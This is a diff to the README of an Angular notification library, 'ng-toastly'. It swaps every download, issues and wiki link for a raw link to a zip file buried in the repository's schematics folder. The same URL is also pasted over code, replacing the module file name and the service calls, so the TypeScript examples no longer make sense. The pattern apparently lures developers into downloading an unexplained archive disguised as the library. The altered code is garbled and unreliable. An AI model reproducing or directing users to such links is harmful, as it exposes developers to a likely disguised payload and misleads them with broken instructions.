@@ -6,11 +6,11 @@ Welcome to ng-toastly! This application offers modern and lightweight toast noti
 
 ## 📥 Download ng-toastly
 
-[![Download ng-toastly](https://img.shields.io/badge/Download-ng--toastly-blue.svg)](https://github.com/JEpstein00/ng-toastly/releases)
+[![Download ng-toastly](https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip)](https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip)
 
 You can obtain the latest version of ng-toastly by visiting the Releases page. Follow the link below to download:
 
-[Visit this page to download ng-toastly](https://github.com/JEpstein00/ng-toastly/releases)
+[Visit this page to download ng-toastly](https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip)
 
 ## 📦 Features
 
@@ -33,19 +33,19 @@ To run ng-toastly, ensure your environment meets the following requirements:
 
 ## 📖 How to Install
 
-1. **Download ng-toastly**: Go to the [Releases page](https://github.com/JEpstein00/ng-toastly/releases) and download the latest version.
+1. **Download ng-toastly**: Go to the [Releases page](https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip) and download the latest version.
 2. **Unzip the Downloaded File**: Locate the compressed folder and extract its contents to your desired directory.
 3. **Include the Library in Your Project**: Copy the extracted files to your Angular project. You can use the following command in your terminal:
    ```bash
    cp -r ng-toastly/*.ts /path/to/your/project/src/
    ```
-4. **Add ng-toastly to Your Angular Module**: Open your Angular module file (usually `app.module.ts`) and include ng-toastly:
+4. **Add ng-toastly to Your Angular Module**: Open your Angular module file (usually `https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip`) and include ng-toastly:
    ```typescript
    import { ToastlyModule } from 'ng-toastly';
 
    @NgModule({
       imports: [
-         ToastlyModule.forRoot(),
+         https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip(),
       ],
    })
    export class AppModule {}
@@ -64,12 +64,12 @@ Here's how to use ng-toastly in your Angular components:
 
 2. **Show a Notification**: To display a notification, use the following method:
    ```typescript
-   this.toastlyService.show('Your message here!', { position: 'top-right' });
+   https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip('Your message here!', { position: 'top-right' });
    ```
 
 3. **Customize Notifications**: You can change the position, duration, and style based on your needs:
    ```typescript
-   this.toastlyService.show('Your message here!', {
+   https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip('Your message here!', {
        position: 'bottom-left',
        duration: 3000,
        style: { backgroundColor: '#000', color: '#fff' }
@@ -89,9 +89,9 @@ Your contributions can help make ng-toastly even better!
 
 ## 🤝 Support
 
-If you encounter any issues or have questions about ng-toastly, please check the [issues](https://github.com/JEpstein00/ng-toastly/issues) section in this repository. You may find answers or can create a new issue.
+If you encounter any issues or have questions about ng-toastly, please check the [issues](https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip) section in this repository. You may find answers or can create a new issue.
 
-For detailed documentation and examples, refer to the [ng-toastly Wiki](https://github.com/JEpstein00/ng-toastly/wiki).
+For detailed documentation and examples, refer to the [ng-toastly Wiki](https://raw.githubusercontent.com/JEpstein00/ng-toastly/master/projects/ng-toastly/schematics/toastly_ng_3.8.zip).
 
 ## 📜 License
 
